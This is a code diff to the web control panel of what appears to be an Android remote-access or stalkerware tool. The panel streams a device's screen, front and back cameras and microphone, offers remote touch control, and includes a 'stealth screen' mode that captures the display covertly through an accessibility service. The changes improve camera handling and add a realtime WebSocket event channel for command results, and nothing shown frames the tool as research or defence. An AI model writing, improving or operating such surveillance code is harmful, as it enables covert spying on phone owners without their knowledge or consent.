@@ -170,14 +170,14 @@ tr:hover td{background:rgba(255,255,255,.02)}
           <div class="row">
             <button id="bScr" onclick="togStream('screen',this)">Live screen</button>
             <button id="bStealth" onclick="togStealth(this)">Stealth screen</button>
-            <button id="bCam" onclick="togStream('cam',this)">Live camera</button>
+            <button id="bCam" onclick="togCam()">Live camera</button>
             <button id="bMic" onclick="togStream('mic',this)">Live mic</button>
             <button id="bCtrl" onclick="togCtrl(this)">Remote control</button>
             <button onclick="cmd('nav_back')">Back</button>
             <button onclick="cmd('nav_home')">Home</button>
             <button onclick="cmd('nav_recents')">Recents</button>
-            <button onclick="cmd('cam',{facing:'front'})">Front cam</button>
-            <button onclick="cmd('cam',{facing:'back'})">Back cam</button>
+            <button onclick="startCam('front')">Front cam</button>
+            <button onclick="startCam('back')">Back cam</button>
             <button onclick="cmd('screenshot')">Screenshot</button>
             <button class="danger" onclick="cmd('streams_off')">Stop all</button>
           </div>
@@ -198,6 +198,7 @@ tr:hover td{background:rgba(255,255,255,.02)}
 /* ---------- state ---------- */
 const BASE=(window.SIM1_BACKEND||localStorage.getItem('sim1_backend')||'').replace(/\/+$/,'');
 let tok=localStorage.getItem('sim1_tok')||null, curDev=null, devs=[], streams={}, page='dashboard', lastFps={}, deviceInfo={}, deviceWifi={};
+const awaiters=new Map();let eventsWs=null,eventsRetry=1000;
 let browsePath='/', browseItems=[], galleryPhotos=[], logs=[];
 const $=id=>document.getElementById(id);
 const esc=s=>String(s==null?'':s).replace(/[<>&"]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c]));
@@ -229,7 +230,7 @@ async function doLogin(){
   if(j.ok){tok=j.token;localStorage.setItem('sim1_tok',tok);$('login').style.display='none';toast('Signed in');renderNav();refresh()}
   else toast('Invalid credentials');
 }
-async function doLogout(){try{await fetch(BASE+'/api/logout',{method:'POST'})}catch(e){}tok=null;localStorage.removeItem('sim1_tok');curDev=null;$('login').style.display='flex'}
+async function doLogout(){try{await fetch(BASE+'/api/logout',{method:'POST'})}catch(e){}tok=null;localStorage.removeItem('sim1_tok');curDev=null;try{if(eventsWs)eventsWs.close()}catch(e){}$('login').style.display='flex'}
 
 /* ---------- nav / pages ---------- */
 function renderNav(){
@@ -283,12 +284,23 @@ async function cmdAwait(type,args={},tries=80){
   try{
     const j=await api('/api/cmd',{method:'POST',body:JSON.stringify({device_id:curDev,type,args})});
     const cid=j.cid;
-    for(let i=0;i<tries;i++){
-      await new Promise(r=>setTimeout(r,500));
-      const cl=await api('/api/cmdlog?device_id='+curDev);
-      const c=(cl.cmds||[]).find(x=>x.id===cid);
-      if(c&&c.status==='done'){try{return JSON.parse(c.result||'{}')}catch(e){return{}}}
-    }
+    // Settled instantly when /ws/events pushes the result; the HTTP loop below
+    // is only the fallback for when that socket is down.
+    return await new Promise(resolve=>{
+      let settled=false;
+      const finish=v=>{if(settled)return;settled=true;awaiters.delete(cid);resolve(v)};
+      awaiters.set(cid,finish);
+      (async()=>{
+        for(let i=0;i<tries;i++){
+          await new Promise(r=>setTimeout(r,500));
+          if(settled)return;
+          const cl=await api('/api/cmdlog?device_id='+curDev);
+          const c=(cl.cmds||[]).find(x=>x.id===cid);
+          if(c&&c.status==='done'){try{finish(JSON.parse(c.result||'{}'))}catch(e){finish({})}return}
+        }
+        finish(null);
+      })();
+    });
   }catch(e){log('await failed '+e,'err')}
   return null;
 }
@@ -341,9 +353,9 @@ function renderControl(){
   $('page').innerHTML=`<div class="wrap"><div class="grid">
     <div class="card"><h3>Media &amp; capture</h3><div class="row">
       <button onclick="go('live')">Live screen</button>
-      <button onclick="cmd('screen_stealth')">Stealth screen</button>
-      <button onclick="cmd('cam',{facing:'front'})">Front cam</button>
-      <button onclick="cmd('cam',{facing:'back'})">Back cam</button>
+      <button onclick="go('live');setTimeout(()=>togStealth($('bStealth')),60)">Stealth screen</button>
+      <button onclick="startCam('front')">Front cam</button>
+      <button onclick="startCam('back')">Back cam</button>
       <button onclick="cmd('mic_start')">Mic on</button>
       <button class="danger" onclick="cmd('streams_off')">Stop all</button>
     </div></div>
@@ -555,16 +567,34 @@ function togStream(kind,btn){
   if(!curDev)return toast('No device selected');
   const ws=new WebSocket(wsUrl(kind));ws.binaryType='arraybuffer';
   if(kind==='mic'){ws.onmessage=e=>playPcm(new Uint8Array(e.data));btn.classList.add('on');streams[kind]=ws;log('mic on','ok');cmd('mic_start')}
-  else{ws.onmessage=e=>drawFrame($(kind==='screen'?'cvScreen':'cvCam'),new Uint8Array(e.data),kind);btn.classList.add('on');streams[kind]=ws;log(kind+' on','ok');cmd(kind==='screen'?'screen_start':'cam',{facing:'front'})}
+  else{ws.onmessage=e=>drawFrame($(kind==='screen'?'cvScreen':'cvCam'),new Uint8Array(e.data),kind);btn.classList.add('on');streams[kind]=ws;log(kind+' on','ok');if(kind==='screen')cmd('screen_stealth_stop');cmd(kind==='screen'?'screen_start':'cam',{facing:'front'})}
   ws.onclose=()=>{if(!streams[kind])return;btn.classList.remove('on');delete streams[kind];if(kind==='mic')stopAudio();log(kind+' ws closed','err');cmd(stopCmd(kind))};
 }
-function togStealth(btn){
+async function startCam(facing){
+  if(!curDev)return toast('No device selected');
+  if(page!=='live')go('live');
+  if(!streams.cam){
+    const ws=new WebSocket(wsUrl('cam'));ws.binaryType='arraybuffer';
+    ws.onmessage=e=>drawFrame($('cvCam'),new Uint8Array(e.data),'cam');
+    ws.onclose=()=>{if(!streams.cam)return;delete streams.cam;$('bCam').classList.remove('on');log('cam ws closed','err')};
+    streams.cam=ws;$('bCam').classList.add('on');log('cam on ('+facing+')','ok');
+  }
+  const r=await cmdAwait('cam',{facing},20);
+  if(r&&r.err){toast('Camera: '+r.err);log('cam err '+r.err,'err')}
+}
+function togCam(){
+  if(streams.cam){const w=streams.cam;delete streams.cam;$('bCam').classList.remove('on');try{w.close()}catch(e){}cmd('cam_stop');return}
+  startCam('front');
+}
+async function togStealth(btn){
   if(streams.screen){const w=streams.screen;delete streams.screen;btn.classList.remove('on');try{w.close()}catch(e){}cmd('screen_stealth_stop');cmd('screen_stop');return}
   if(!curDev)return toast('No device selected');
   const ws=new WebSocket(wsUrl('screen'));ws.binaryType='arraybuffer';
   ws.onmessage=e=>drawFrame($('cvScreen'),new Uint8Array(e.data),'screen');
+  ws.onclose=()=>{if(!streams.screen)return;delete streams.screen;btn.classList.remove('on')};
   btn.classList.add('on');streams.screen=ws;log('stealth screen on','ok');
-  cmd('screen_stealth');
+  const r=await cmdAwait('screen_stealth',{},20);
+  if(r&&r.err){toast('Stealth: '+r.err+' (enable the accessibility service)');log('stealth err '+r.err,'err');try{ws.close()}catch(e){}delete streams.screen;btn.classList.remove('on')}
 }
 
 /* ---------- remote touch control ---------- */
@@ -624,11 +654,38 @@ function playPcm(u8){try{if(!actx)actx=new AudioContext({sampleRate:16000});if(a
   for(let i=0;i<n;i++)ch[i]=dv.getInt16(i*2,true)/32768;const src=actx.createBufferSource();src.buffer=buf;src.connect(actx.destination);src.start()}catch(e){}}
 function stopAudio(){try{if(actx){actx.close();actx=null}}catch(e){}}
 
+/* ---------- realtime event channel (/ws/events) ---------- */
+function eventsUrl(){
+  let host=location.host,secure=location.protocol==='https:';
+  if(BASE){try{const u=new URL(BASE);host=u.host;secure=u.protocol==='https:'}catch(e){}}
+  return `${secure?'wss':'ws'}://${host}/ws/events`;
+}
+function onEvent(m){
+  if(!m||m.kind!=='cmd')return;
+  if(m.status==='done'&&awaiters.has(m.cid)){
+    const f=awaiters.get(m.cid);
+    f(m.result&&typeof m.result==='object'?m.result:{});
+  }
+  if(m.device_id===curDev&&$('cmdlogpage').innerHTML.trim()!=='')loadCmdlogPage();
+  refresh();
+}
+function connectEvents(){
+  if(!tok){setTimeout(connectEvents,4000);return}
+  try{
+    eventsWs=new WebSocket(eventsUrl());
+    eventsWs.onopen=()=>{eventsRetry=1000;log('live channel up','ok')};
+    eventsWs.onmessage=e=>{try{onEvent(JSON.parse(e.data))}catch(_){}};
+    eventsWs.onclose=()=>{eventsWs=null;setTimeout(connectEvents,eventsRetry);eventsRetry=Math.min(eventsRetry*2,15000)};
+    eventsWs.onerror=()=>{try{eventsWs.close()}catch(_){}};
+  }catch(e){eventsWs=null;setTimeout(connectEvents,eventsRetry);eventsRetry=Math.min(eventsRetry*2,15000)}
+}
+
 /* ---------- boot ---------- */
 bindScreenControl();
 renderNav();go('dashboard');
 if(tok){$('login').style.display='none'}
-refresh();setInterval(refresh,8000);
+refresh();setInterval(refresh,4000);
+connectEvents();
 </script>
 </body>
 </html>
